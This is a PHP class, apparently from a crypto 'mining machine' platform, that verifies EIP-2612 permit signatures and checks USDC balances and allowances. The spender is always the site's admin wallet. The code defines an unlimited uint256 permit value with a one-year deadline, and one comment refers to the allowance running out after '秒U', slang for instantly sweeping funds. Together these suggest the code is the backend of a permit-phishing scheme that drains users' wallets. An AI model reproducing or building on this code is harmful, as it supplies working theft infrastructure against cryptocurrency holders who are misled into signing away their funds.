<?php

namespace app\common\library;

use GuzzleHttp\Client;
use kornrunner\Keccak;
use Pelieth\LaravelEcrecover\EthSigRecover;
use think\Config;

/**
 * Ethereum 主网 USDC (EIP-2612 permit) 授权与余额查询
 */
class HecEth
{
    const CHAIN_ID = 1;
    const PERMIT_DOMAIN_NAME = 'USD Coin';
    const PERMIT_DOMAIN_VERSION = '2';
    const PERMIT_DEADLINE_SECONDS = 31536000;

    public static function config()
    {
        return Config::get('hec.eth') ?: [];
    }

    public static function adminWallet()
    {
        $candidates = [];

        $fromSite = self::sanitizeAddressCandidate(Config::get('site.admin_wallet', ''));
        if ($fromSite !== '') {
            $candidates[] = $fromSite;
        }

        foreach (self::collectSiteAddressList('one_address') as $addr) {
            $candidates[] = $addr;
        }

        $fromHec = self::sanitizeAddressCandidate(self::config()['admin_wallet'] ?? '');
        if ($fromHec !== '') {
            $candidates[] = $fromHec;
        }

        foreach ($candidates as $addr) {
            $normalized = self::normalizeAddress($addr);
            if ($normalized !== '') {
                return $normalized;
            }
        }

        return '';
    }

    /** 清理后台配置里常见的引号、空格，并补全 0x 前缀 */
    protected static function sanitizeAddressCandidate($address)
    {
        $address = trim((string)$address);
        if ($address === '') {
            return '';
        }
        $address = trim($address, " \t\n\r\0\x0B\"'{}[]");
        if (preg_match('/^(0x)?[a-fA-F0-9]{40}$/', $address) === 1) {
            if (stripos($address, '0x') !== 0) {
                $address = '0x' . $address;
            }
        }
        return $address;
    }

    /** 从 site 配置读取地址列表（兼容 array / JSON 字符串） */
    protected static function collectSiteAddressList($key)
    {
        $raw = Config::get('site.' . $key);
        $list = [];

        if (is_array($raw)) {
            $list = $raw;
        } elseif (is_string($raw) && $raw !== '') {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $list = $decoded;
            } else {
                $list = [$raw];
            }
        }

        $out = [];
        foreach ($list as $addr) {
            $addr = self::sanitizeAddressCandidate($addr);
            if ($addr !== '') {
                $out[] = $addr;
            }
        }
        return $out;
    }

    public static function usdcContract()
    {
        return strtolower(trim((string)(self::config()['usdc_contract'] ?? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48')));
    }

    public static function tokenDecimals()
    {
        return (int)(self::config()['token_decimals'] ?? 6);
    }

    public static function rpcUrl()
    {
        $urls = self::rpcUrls();
        return $urls[0] ?? 'https://ethereum-rpc.publicnode.com';
    }

    /** @return string[] */
    public static function rpcUrls()
    {
        $cfg = self::config();
        $urls = [];

        if (!empty($cfg['rpc_urls']) && is_array($cfg['rpc_urls'])) {
            foreach ($cfg['rpc_urls'] as $url) {
                $url = trim((string)$url);
                if ($url !== '') {
                    $urls[] = $url;
                }
            }
        }

        $primary = trim((string)($cfg['rpc_url'] ?? ''));
        if ($primary !== '') {
            array_unshift($urls, $primary);
        }

        foreach ([
            'https://ethereum.publicnode.com',
            'https://eth.drpc.org',
            'https://cloudflare-eth.com',
        ] as $fallback) {
            $urls[] = $fallback;
        }

        return array_values(array_unique($urls));
    }

    public static function minAllowanceRaw()
    {
        return (string)(self::config()['min_allowance'] ?? '1000000');
    }

    public static function maxPermitValueRaw()
    {
        return '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    }

    public static function isEvmAddress($address)
    {
        return (bool)preg_match('/^0x[a-fA-F0-9]{40}$/', (string)$address);
    }

    public static function normalizeAddress($address)
    {
        $address = trim((string)$address);
        if (!self::isEvmAddress($address)) {
            return '';
        }
        return '0x' . strtolower(substr($address, 2));
    }

    public static function priceToRaw($amount)
    {
        $amount = trim((string)$amount);
        if ($amount === '' || !is_numeric($amount)) {
            return '0';
        }
        $decimals = self::tokenDecimals();
        $scale = bcpow('10', (string)$decimals, 0);
        if (function_exists('bcmul')) {
            return bcmul($amount, $scale, 0);
        }
        return (string)round((float)$amount * (10 ** $decimals));
    }

    public static function rawToAmount($raw)
    {
        $raw = trim((string)$raw);
        if ($raw === '') {
            return '0';
        }
        $decimals = self::tokenDecimals();
        $scale = bcpow('10', (string)$decimals, 0);
        if (function_exists('bcdiv')) {
            return rtrim(rtrim(bcdiv($raw, $scale, $decimals), '0'), '.');
        }
        return (string)((float)$raw / (10 ** $decimals));
    }

    public static function formatUsdcRequired($amount)
    {
        $formatted = number_format((float)$amount, 2, '.', '');
        return rtrim(rtrim($formatted, '0'), '.') ?: '0';
    }

    public static function formatUsdcBalance($amount)
    {
        return number_format((float)$amount, 2, '.', '');
    }

    public static function formatInsufficientUsdcMessage($required, $current, $purpose = '', $minerCount = 0)
    {
        $shortfall = max(0, (float)$required - (float)$current);
        $req = self::formatUsdcRequired($required);
        $bal = self::formatUsdcBalance($current);
        $short = self::formatUsdcRequired($shortfall);
        $purpose = trim((string)$purpose);
        $minerCount = (int)$minerCount;
        if ($purpose !== '') {
            if ($minerCount > 1) {
                return sprintf(
                    '%s需要 %s USDC（共 %d 台矿机），账户余额 %s USDC，还差 %s USDC',
                    $purpose,
                    $req,
                    $minerCount,
                    $bal,
                    $short
                );
            }
            return sprintf(
                '%s需要 %s USDC，账户余额 %s USDC，还差 %s USDC',
                $purpose,
                $req,
                $bal,
                $short
            );
        }
        return sprintf(
            'USDC 余额不足，还差 %s USDC，当前余额 %s USDC',
            $short,
            $bal
        );
    }

    public static function isAllowanceSufficient($allowanceRaw, $minRaw = null)
    {
        $allowanceRaw = trim((string)$allowanceRaw);
        if ($allowanceRaw === '') {
            return false;
        }
        if (HecUsdcApprove::isUnlimitedRaw($allowanceRaw)) {
            return true;
        }
        $min = $minRaw !== null ? trim((string)$minRaw) : self::minAllowanceRaw();
        if ($min === '') {
            $min = self::minAllowanceRaw();
        }
        return function_exists('bccomp')
            ? bccomp($allowanceRaw, $min, 0) >= 0
            : (float)$allowanceRaw >= (float)$min;
    }

    /**
     * 授权校验所需的最小 raw 额度：配置下限与在售最低价矿机取较大值
     */
    public static function minRequiredAllowanceRaw()
    {
        $minRaw = self::minAllowanceRaw();
        try {
            $cheapest = \app\common\model\MinerType::where('status', 1)->min('price');
            if ($cheapest !== null && is_numeric($cheapest)) {
                $priceRaw = self::priceToRaw($cheapest);
                if (function_exists('bccomp') && bccomp($priceRaw, $minRaw, 0) > 0) {
                    return $priceRaw;
                }
                if (!function_exists('bccomp') && (float)$priceRaw > (float)$minRaw) {
                    return $priceRaw;
                }
            }
        } catch (\Throwable $e) {
            // ignore
        }
        return $minRaw;
    }

    /**
     * 链上授权额度是否足够（秒U 后额度耗尽时返回 false，需重新授权）
     */
    public static function hasValidPermit($owner, $permitExpiresAt = 0)
    {
        if ((int)$permitExpiresAt > time()) {
            return true;
        }
        return self::hasValidApprove($owner);
    }

    public static function hasValidApprove($owner)
    {
        $owner = self::normalizeAddress($owner);
        $spender = self::normalizeAddress(self::adminWallet());
        if (!$owner || !$spender) {
            return false;
        }
        try {
            $allowance = self::fetchAllowance($owner, $spender);
            return self::isAllowanceSufficient($allowance, self::minRequiredAllowanceRaw());
        } catch (\Throwable $e) {
            return false;
        }
    }

    public static function buildMinerEligibility($owner, $price, $purpose = '申请矿机', $permitExpiresAt = 0, $skipBalanceCheck = false, $minerCount = 0)
    {
        $purpose = trim((string)$purpose) ?: '申请矿机';
        $owner = self::normalizeAddress($owner);
        $requiredRaw = self::priceToRaw($price);
        $requiredAmount = self::rawToAmount($requiredRaw);
        $minerCount = (int)$minerCount;
        $spender = self::normalizeAddress(self::adminWallet());
        $result = [
            'eligible'       => false,
            'requiredAmount' => $requiredAmount,
            'minerCount'     => $minerCount,
            'allowance'      => '0',
            'allowanceOk'    => false,
            'usdtBalance'    => '0',
            'usdcBalance'    => '0',
            'balanceOk'      => false,
            'message'        => '',
            'messages'       => [],
        ];

        if (!$owner) {
            $result['message'] = '请先连接 Ethereum 钱包';
            $result['messages'][] = $result['message'];
            return $result;
        }
        if (!$spender) {
            $result['message'] = '平台收款钱包未配置';
            $result['messages'][] = $result['message'];
            return $result;
        }
        if (bccomp($requiredRaw, '0', 0) <= 0) {
            $result['eligible'] = true;
            return $result;
        }

        $hasValidOffChainPermit = (int)$permitExpiresAt > time();

        if ($skipBalanceCheck) {
            $result['balanceOk'] = true;
        } else {
            try {
                $balanceRaw = self::fetchTokenBalance($owner, self::usdcContract());
                $result['usdtBalance'] = self::rawToAmount($balanceRaw);
                $result['usdcBalance'] = $result['usdtBalance'];
                $result['balanceOk'] = bccomp($balanceRaw, $requiredRaw, 0) >= 0;
                if (!$result['balanceOk']) {
                    $result['messages'][] = self::formatInsufficientUsdcMessage(
                        $requiredAmount,
                        $result['usdcBalance'],
                        $purpose,
                        $minerCount
                    );
                }
            } catch (\Throwable $e) {
                $result['messages'][] = '无法查询钱包 USDC 余额，请稍后重试';
            }
        }

        $chainBalanceText = self::formatUsdcBalance($result['usdcBalance']);

        try {
            $result['allowance'] = self::fetchAllowance($owner, $spender);
            $result['allowanceOk'] = HecUsdcApprove::isUnlimitedRaw($result['allowance'])
                || bccomp($result['allowance'], $requiredRaw, 0) >= 0;
            if (!$result['allowanceOk'] && !$hasValidOffChainPermit) {
                $reauthHint = ((int)$permitExpiresAt > 0 && (int)$permitExpiresAt <= time()) ? '，请重新完成授权' : '';
                $msg = sprintf(
                    'USDC 授权额度不足，%s需要 %s USDC，当前链上授权 %s USDC，账户链上余额 %s USDC%s',
                    $purpose,
                    self::formatUsdcRequired($requiredAmount),
                    self::formatUsdcRequired(self::rawToAmount($result['allowance'])),
                    $chainBalanceText,
                    $reauthHint
                );
                $result['messages'][] = $msg;
            }
        } catch (\Throwable $e) {
            if (!$hasValidOffChainPermit) {
                $result['messages'][] = '无法查询 USDC 授权额度，请稍后重试';
            }
        }

        // 链下 Permit 未过期：视为授权有效（链上 allowance 可能仍为 0，待上链）
        if ($hasValidOffChainPermit) {
            $result['allowanceOk'] = true;
        }

        $result['eligible'] = $result['allowanceOk'] && $result['balanceOk'];
        $result['message'] = $result['eligible'] ? '' : implode('；', $result['messages']);
        return $result;
    }

    public static function assertMinerApplyEligible($owner, $price, $purpose = '申请矿机', $permitExpiresAt = 0, $skipBalanceCheck = false, $minerCount = 0)
    {
        $check = self::buildMinerEligibility($owner, $price, $purpose, $permitExpiresAt, $skipBalanceCheck, $minerCount);
        if (!$check['eligible']) {
            $fallback = $purpose === '启动矿机' ? '钱包额度或余额不足，无法启动矿机' : '钱包额度或余额不足，无法申请矿机';
            if (!$check['balanceOk']) {
                throw new \think\Exception(
                    self::formatInsufficientUsdcMessage(
                        $check['requiredAmount'],
                        $check['usdcBalance'],
                        $purpose,
                        (int)($check['minerCount'] ?? $minerCount)
                    )
                );
            }
            throw new \think\Exception($check['message'] ?: $fallback);
        }
    }

    public static function describeApproveFailure($owner, $permitExpiresAt = 0, $requiredPrice = null)
    {
        $owner = self::normalizeAddress($owner);
        $spender = self::normalizeAddress(self::adminWallet());
        if (!$owner) {
            return '请先连接有效的 Ethereum 钱包';
        }
        if (!$spender) {
            return '平台收款钱包未配置，请联系管理员';
        }
        $balanceRaw = '0';
        try {
            $balanceRaw = self::fetchTokenBalance($owner, self::usdcContract());
        } catch (\Throwable $e) {
            // ignore
        }

        $required = $requiredPrice !== null && $requiredPrice !== ''
            ? $requiredPrice
            : self::rawToAmount(self::minAllowanceRaw());

        return self::formatInsufficientUsdcMessage($required, self::rawToAmount($balanceRaw));
    }

    public static function fetchAllowance($owner, $spender)
    {
        $owner = self::normalizeAddress($owner);
        $spender = self::normalizeAddress($spender);
        $contract = self::usdcContract();
        if (!$owner || !$spender || !$contract) {
            throw new \InvalidArgumentException('无效的 EVM 地址');
        }
        $data = '0xdd62ed3e' . self::encodeAddress($owner) . self::encodeAddress($spender);
        return self::decodeUint256(self::ethCall($contract, $data));
    }

    public static function fetchTokenBalance($owner, $contract = null)
    {
        $owner = self::normalizeAddress($owner);
        $contract = self::normalizeAddress($contract ?: self::usdcContract());
        if (!$owner || !$contract) {
            throw new \InvalidArgumentException('无效的 EVM 地址');
        }
        $data = '0x70a08231' . self::encodeAddress($owner);
        return self::decodeUint256(self::ethCall($contract, $data));
    }

    public static function fetchNonce($owner)
    {
        $owner = self::normalizeAddress($owner);
        $contract = self::usdcContract();
        if (!$owner || !$contract) {
            throw new \InvalidArgumentException('无效的 EVM 地址');
        }
        $data = '0x7ecebe00' . self::encodeAddress($owner);
        return self::decodeUint256(self::ethCall($contract, $data));
    }

    /** 单次快速 nonce 查询（Permit 验签可选步骤，失败不阻断） */
    protected static function tryFetchNonce($owner)
    {
        $owner = self::normalizeAddress($owner);
        $contract = self::usdcContract();
        if (!$owner || !$contract) {
            throw new \InvalidArgumentException('无效的 EVM 地址');
        }
        $data = '0x7ecebe00' . self::encodeAddress($owner);
        return self::decodeUint256(self::ethCallVia(self::rpcUrl(), $contract, $data, 5, 3));
    }

    /**
     * 校验 EIP-2612 Permit 签名并返回 deadline
     *
     * @return array{deadline:int,value:string}
     */
    public static function verifyPermitPayload(array $input)
    {
        $owner = self::normalizeAddress($input['owner'] ?? '');
        $spender = self::normalizeAddress($input['spender'] ?? '');
        $admin = self::normalizeAddress(self::adminWallet());
        $chainId = (int)($input['chainId'] ?? 0);
        $nonce = trim((string)($input['nonce'] ?? ''));
        $deadline = trim((string)($input['deadline'] ?? ''));
        $value = trim((string)($input['value'] ?? ''));
        $signature = trim((string)($input['signature'] ?? ''));

        if (!$owner) {
            throw new \InvalidArgumentException('无效的钱包地址');
        }
        if (!$spender || !$admin || strtolower($spender) !== strtolower($admin)) {
            throw new \InvalidArgumentException('授权对象无效');
        }
        if ($chainId !== self::CHAIN_ID) {
            throw new \InvalidArgumentException('仅支持 Ethereum 主网');
        }
        if ($deadline === '' || (int)$deadline <= time()) {
            throw new \InvalidArgumentException('授权已过期，请重新签名');
        }
        if ($value === '' || bccomp($value, self::minAllowanceRaw(), 0) < 0) {
            throw new \InvalidArgumentException('授权额度不足');
        }
        if ($signature === '' || !preg_match('/^0x[a-fA-F0-9]{130}$/', $signature)) {
            throw new \InvalidArgumentException('无效的签名');
        }
        if ($nonce === '') {
            throw new \InvalidArgumentException('签名 nonce 无效，请刷新后重试');
        }

        // 链下 Permit 以 ecrecover 为准；链上 nonce 仅作防重放，RPC 不可用时不阻断存档
        $recovered = self::recoverPermitSigner($owner, $spender, $value, $nonce, $deadline, $signature);
        if (strtolower($recovered) !== strtolower($owner)) {
            throw new \InvalidArgumentException('签名验证失败');
        }

        try {
            $onChainNonce = self::tryFetchNonce($owner);
            if (bccomp($nonce, $onChainNonce, 0) !== 0) {
                throw new \InvalidArgumentException('签名 nonce 无效，请刷新后重试');
            }
        } catch (\InvalidArgumentException $e) {
            throw $e;
        } catch (\Throwable $e) {
            // 服务器 RPC 超时/不可达时，已通过密码学验签，仍保存链下 Permit
        }

        return [
            'deadline' => (int)$deadline,
            'value'    => $value,
        ];
    }

    protected static function recoverPermitSigner($owner, $spender, $value, $nonce, $deadline, $signature)
    {
        $digest = self::hashPermitTypedData($owner, $spender, $value, $nonce, $deadline);
        $recover = new EthSigRecover();
        return strtolower($recover->ecRecover($digest, $signature));
    }

    protected static function hashPermitTypedData($owner, $spender, $value, $nonce, $deadline)
    {
        $domainTypeHash = self::keccak256Bytes('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)');
        $permitTypeHash = self::keccak256Bytes('Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)');

        $domainSeparator = self::keccak256Binary(
            $domainTypeHash
            . self::keccak256Bytes(self::PERMIT_DOMAIN_NAME)
            . self::keccak256Bytes(self::PERMIT_DOMAIN_VERSION)
            . self::encodeUint256Word(self::CHAIN_ID)
            . self::encodeAddress(self::usdcContract())
        );

        $structHash = self::keccak256Binary(
            $permitTypeHash
            . self::encodeAddress($owner)
            . self::encodeAddress($spender)
            . self::encodeUint256Word($value)
            . self::encodeUint256Word($nonce)
            . self::encodeUint256Word($deadline)
        );

        return '0x' . Keccak::hash("\x19\x01" . hex2bin($domainSeparator . $structHash), 256);
    }

    protected static function ethCall($to, $data)
    {
        $last = null;
        foreach (self::rpcUrls() as $url) {
            try {
                return self::ethCallVia($url, $to, $data);
            } catch (\Throwable $e) {
                $last = $e;
            }
        }

        throw $last ?: new \RuntimeException('RPC 无响应，请稍后重试');
    }

    protected static function ethCallVia($rpcUrl, $to, $data, $timeout = 15, $connectTimeout = 8)
    {
        $client = new Client(['timeout' => $timeout, 'connect_timeout' => $connectTimeout, 'http_errors' => false]);
        $response = $client->post($rpcUrl, [
            'headers' => ['Content-Type' => 'application/json'],
            'json'    => [
                'jsonrpc' => '2.0',
                'id'      => 1,
                'method'  => 'eth_call',
                'params'  => [
                    [
                        'to'   => self::normalizeAddress($to),
                        'data' => $data,
                    ],
                    'latest',
                ],
            ],
        ]);

        $status = $response->getStatusCode();
        $raw = (string)$response->getBody();
        if ($status < 200 || $status >= 300 || $raw === '') {
            throw new \RuntimeException('RPC 无响应，请稍后重试');
        }

        $body = json_decode($raw, true);
        if (!is_array($body) || !empty($body['error'])) {
            $msg = is_array($body['error'] ?? null) ? ($body['error']['message'] ?? 'RPC 错误') : 'RPC 响应无效';
            throw new \RuntimeException((string)$msg);
        }

        return (string)($body['result'] ?? '0x');
    }

    public static function decodeUint256($hex)
    {
        $hex = strtolower(trim((string)$hex));
        if ($hex === '' || $hex === '0x' || $hex === '0x0') {
            return '0';
        }
        $hex = substr($hex, 2);
        $hex = ltrim($hex, '0');
        if ($hex === '') {
            return '0';
        }
        if (function_exists('gmp_init')) {
            return gmp_strval(gmp_init($hex, 16), 10);
        }
        if (function_exists('bcadd')) {
            $dec = '0';
            $len = strlen($hex);
            for ($i = 0; $i < $len; $i++) {
                $dec = bcmul($dec, '16', 0);
                $dec = bcadd($dec, (string)hexdec($hex[$i]), 0);
            }
            return $dec;
        }
        return (string)hexdec(substr($hex, -16));
    }

    public static function encodeAddress($address)
    {
        $address = self::normalizeAddress($address);
        return str_pad(substr($address, 2), 64, '0', STR_PAD_LEFT);
    }

    public static function encodeUint256Word($decimal)
    {
        $decimal = trim((string)$decimal);
        if ($decimal === '' || $decimal === '0') {
            return str_repeat('0', 64);
        }
        if (function_exists('gmp_init')) {
            $hex = gmp_strval(gmp_init($decimal, 10), 16);
        } else {
            $hex = '';
            $num = $decimal;
            while (bccomp($num, '0') > 0) {
                $rem = bcmod($num, '16');
                $hex = dechex((int)$rem) . $hex;
                $num = bcdiv($num, '16', 0);
            }
            if ($hex === '') {
                $hex = '0';
            }
        }
        return str_pad(strtolower($hex), 64, '0', STR_PAD_LEFT);
    }

    protected static function keccak256Bytes($text)
    {
        return Keccak::hash($text, 256);
    }

    protected static function keccak256Binary($hexWordsConcat)
    {
        return Keccak::hash(hex2bin($hexWordsConcat), 256);
    }

    /**
     * 解析 EIP-2612 签名（0x + 130 hex）为 v/r/s
     *
     * @return array{v:int,r:string,s:string}
     */
    public static function parsePermitSignature($signature)
    {
        $signature = trim((string)$signature);
        if (!preg_match('/^0x([a-fA-F0-9]{130})$/', $signature, $m)) {
            throw new \InvalidArgumentException('无效的 Permit 签名');
        }
        $hex = $m[1];
        $v = (int)hexdec(substr($hex, 128, 2));
        if ($v < 27) {
            $v += 27;
        }
        return [
            'v' => $v,
            'r' => '0x' . strtolower(substr($hex, 0, 64)),
            's' => '0x' . strtolower(substr($hex, 64, 64)),
        ];
    }
}
